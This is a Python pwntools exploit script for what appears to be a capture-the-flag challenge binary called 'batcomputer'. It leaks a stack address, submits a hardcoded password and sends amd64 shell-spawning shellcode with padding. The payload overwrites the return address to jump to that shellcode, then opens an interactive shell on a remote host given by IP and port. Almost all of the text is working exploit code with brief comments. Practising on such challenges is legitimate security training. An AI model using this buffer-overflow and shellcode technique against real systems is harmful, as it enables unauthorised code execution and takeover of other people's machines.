### Bat computer
# Note: the location of each of the stack
# So method is to find base address and calculate offset at each given interval
# main: 0x5555555551ec
# can also do gdb-peda$ disass 0x00007ffff7e13d0a

# 0x5555555551a9
# b4tp@$$w0rd!

# 0x7fffffffe364


from pwnlib.asm import *
from pwn import *
# from pwnlib import *
# from pwnlib import asm

LOCAL = False
# context(os = 'linux', arch='amd64')
# context.log_level='DEBUG'
# LOCAL = True
elf = ELF('./batcomputer')
# print(elf.__dict__)

# need to do popad() for stack alignment. popad() adds space onto the stack
shellcode = asm(shellcraft.amd64.popad() + shellcraft.amd64.sh(), arch='amd64')
# shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
print(len(shellcode))
# shellcode = pwnlib.asm()
print(shellcode)
password = "b4tp@$$w0rd!" # b4tp@$$w0rd!
# payload = b'A' * 76 + b'C' * 8 # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCBBBBBBBB
payload = shellcode + b'A' * (76 - len(shellcode))  

if LOCAL:
# starting process
	p = elf.process()
else:
	p = remote('138.68.189.41', 31346)

# get location of joker
p.recvuntil("> ")
p.sendline("1")
stack_loc = p.recvuntil("> ")
stack_loc = stack_loc.split(b'\n')[0].split(b'0x')[1].decode()

# send payload using password
p.sendline("2")
p.recvuntil(": ")
p.sendline(password)
p.recvuntil(": ")
print(stack_loc)
p.sendline(payload + 8 * b'A' + p64(int(stack_loc, 16)))
print(stack_loc)

# trigger seg fault
p.recvline()
a = p.recvuntil("> ")
print(a)
input("Awaiting input")
a = p.sendline("3")

# p.interactive()
p.interactive()




